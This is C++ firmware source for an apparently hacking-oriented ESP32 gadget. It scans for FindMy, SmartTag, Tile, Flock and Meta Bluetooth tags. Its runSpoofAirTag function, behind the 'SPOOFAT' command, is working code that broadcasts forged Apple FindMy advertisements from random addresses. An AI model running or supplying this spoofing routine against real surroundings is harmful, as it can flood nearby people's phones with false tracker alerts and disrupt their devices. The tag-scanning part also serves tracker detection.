#include "ble_tags.h"
#include "ble_bridge.h"
#include "config.h"
#include "settings.h"

#if FOX_HAS_BLE

#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>

namespace {
enum class TagType { FINDMY, SMARTTAG, TILE, FLOCK, META };

const char* tagTypeLabel(TagType t) {
  switch (t) {
    case TagType::FINDMY: return "FINDMY";
    case TagType::SMARTTAG: return "SMARTTAG";
    case TagType::TILE: return "TILE";
    case TagType::FLOCK: return "FLOCK";
    case TagType::META: return "META";
  }
  return "?";
}

bool isFindMy(BLEAdvertisedDevice& device, uint8_t* batteryStatusOut) {
  if (!device.haveManufacturerData()) return false;

  String data = device.getManufacturerData();
  if (data.length() < 5) return false;
  const uint8_t* b = (const uint8_t*)data.c_str();
  if (b[0] != 0x4C || b[1] != 0x00 || b[2] != 0x12) return false;
  *batteryStatusOut = b[4];
  return true;
}

bool isSmartTag(BLEAdvertisedDevice& device) {
  if (!device.haveServiceData()) return false;
  return device.getServiceDataUUID().equals(BLEUUID((uint16_t)0xFD5A));
}

bool isTile(BLEAdvertisedDevice& device) {
  return device.isAdvertisingService(BLEUUID((uint16_t)0xFEED));
}

bool isFlock(BLEAdvertisedDevice& device) {
  if (!device.haveManufacturerData()) return false;
  String data = device.getManufacturerData();
  if (data.length() < 2) return false;
  const uint8_t* b = (const uint8_t*)data.c_str();

  return b[0] == 0xA8 && b[1] == 0x09;
}

bool isMeta(BLEAdvertisedDevice& device) {
  if (!device.haveManufacturerData()) return false;
  String data = device.getManufacturerData();
  if (data.length() < 2) return false;
  const uint8_t* b = (const uint8_t*)data.c_str();

  return b[0] == 0x5B && b[1] == 0x07;
}

const char* batteryLabel(uint8_t status) {
  switch (status & 0xF0) {
    case 0x10: return "full";
    case 0x50: return "medium";
    case 0x90: return "low";
    case 0xD0: return "verylow";
    default: return "unknown";
  }
}

class TagScanCallback : public BLEAdvertisedDeviceCallbacks {
public:
  TagType type;
  int foundCount = 0;

  void onResult(BLEAdvertisedDevice device) {
    uint8_t battery = 0;
    bool haveBattery = false;
    bool match = false;

    switch (type) {
      case TagType::FINDMY:
        match = isFindMy(device, &battery);
        haveBattery = match;
        break;
      case TagType::SMARTTAG:
        match = isSmartTag(device);
        break;
      case TagType::TILE:
        match = isTile(device);
        break;
      case TagType::FLOCK:
        match = isFlock(device);
        break;
      case TagType::META:
        match = isMeta(device);
        break;
    }
    if (!match) return;

    foundCount++;
    Serial.print("TAG:");
    Serial.print(tagTypeLabel(type));
    Serial.print(":");
    Serial.print(device.getAddress().toString().c_str());
    Serial.print(" rssi:");
    Serial.print(device.getRSSI());
    if (haveBattery) {
      Serial.print(" batt:");
      Serial.print(batteryLabel(battery));
    }
    Serial.println();
  }
};

bool runSpoofAirTag() {
  if (!FoxSettings::attacksEnabled()) return false;
  if (!FoxBle::ensureInitialized()) return false;

  BLEScan* scan = BLEDevice::getScan();
  scan->stop();

#if FOX_BLE_NIMBLE
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  pAdv->setMinInterval(BLE_SPOOFAT_INTERVAL_MS * 8 / 5);
  pAdv->setMaxInterval(BLE_SPOOFAT_INTERVAL_MS * 8 / 5);
  pAdv->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
  pAdv->setScanResponse(false);
#else
  esp_ble_adv_params_t advParams = {};
  advParams.adv_int_min = BLE_SPOOFAT_INTERVAL_MS * 8 / 5;
  advParams.adv_int_max = BLE_SPOOFAT_INTERVAL_MS * 8 / 5;
  advParams.adv_type = ADV_TYPE_NONCONN_IND;
  advParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
  advParams.channel_map = ADV_CHNL_ALL;
  advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
#endif

  unsigned long start = millis();
  while (millis() - start < (unsigned long)BLESPAM_BURST_SECONDS * 1000UL) {
    uint8_t payload[30];
    uint8_t inner[27];
    inner[0] = 0x12;
    inner[1] = 0x19;
    inner[2] = 0x10;
    for (int i = 3; i < 13; i++) inner[i] = (uint8_t)random(0, 256);
    inner[13] = (uint8_t)random(0, 256);

    size_t pos = 0;
    payload[pos++] = 0x02; payload[pos++] = 0x01; payload[pos++] = 0x06;
    payload[pos++] = (uint8_t)(1 + 2 + 14);
    payload[pos++] = 0xFF;
    payload[pos++] = 0x4C; payload[pos++] = 0x00;
    memcpy(payload + pos, inner, 14); pos += 14;

    uint8_t addr[6];
    for (int i = 0; i < 6; i++) addr[i] = (uint8_t)random(0, 256);
    addr[5] = (uint8_t)((addr[5] & 0x3F) | 0xC0);

#if FOX_BLE_NIMBLE
    pAdv->stop();
    BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    BLEDevice::setOwnAddr(addr);
    BLEAdvertisementData advData;
    advData.addData((char*)payload, pos);
    pAdv->setAdvertisementData(advData);
    pAdv->start();
#else
    esp_ble_gap_stop_advertising();
    esp_ble_gap_set_rand_addr(addr);
    esp_ble_gap_config_adv_data_raw(payload, pos);
    esp_ble_gap_start_advertising(&advParams);
#endif

    delay(BLE_SPOOFAT_INTERVAL_MS);
  }

#if FOX_BLE_NIMBLE
  pAdv->stop();
#else
  esp_ble_gap_stop_advertising();
#endif
  return true;
}

bool runTagScan(TagType type) {
  if (!FoxBle::ensureInitialized()) return false;

  BLEScan* scan = BLEDevice::getScan();
  TagScanCallback* cb = new TagScanCallback();
  cb->type = type;
  scan->setAdvertisedDeviceCallbacks(cb);
  scan->setActiveScan(true);
  scan->setInterval(100);
  scan->setWindow(99);
  scan->start(BLE_TAG_SCAN_SECONDS, false);
  scan->clearResults();

  Serial.print("TAGSCANDONE:");
  Serial.println(cb->foundCount);
  return true;
}
}

namespace FoxBleTags {
bool handleCommand(const String& line) {
  if (line.startsWith("BLETAGSCAN:")) {
    String modeStr = line.substring(11);
    modeStr.trim();
    modeStr.toUpperCase();

    TagType type;
    if (modeStr == "FINDMY") type = TagType::FINDMY;
    else if (modeStr == "SMARTTAG") type = TagType::SMARTTAG;
    else if (modeStr == "TILE") type = TagType::TILE;
    else if (modeStr == "FLOCK") type = TagType::FLOCK;
    else if (modeStr == "META") type = TagType::META;
    else {
      Serial.println("ERROR:BADMODE");
      return true;
    }

    if (!runTagScan(type)) {
      Serial.println("ERROR");
    }
    return true;
  }

  if (line == "SPOOFAT") {
    if (!runSpoofAirTag()) {
      Serial.println("ERROR");
    } else {
      Serial.println("ATTACKDONE");
    }
    return true;
  }

  return false;
}
}

#else

namespace FoxBleTags {
bool handleCommand(const String& line) {
  if (line.startsWith("BLETAGSCAN:") || line == "SPOOFAT") {
    Serial.println("ERROR:Incompatible ESP32-S2 Module has no BLE");
    return true;
  }
  return false;
}
}

#endif
